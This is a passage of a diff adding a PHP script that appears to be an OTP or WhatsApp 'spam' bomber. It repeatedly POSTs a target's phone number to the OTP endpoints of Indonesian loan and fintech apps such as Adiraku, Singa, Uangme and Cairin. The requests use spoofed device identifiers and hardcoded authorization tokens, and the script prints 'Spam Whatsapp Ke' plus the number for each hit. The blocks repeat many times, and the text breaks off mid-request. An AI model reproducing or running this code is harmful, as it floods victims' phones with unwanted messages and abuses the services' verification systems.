+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
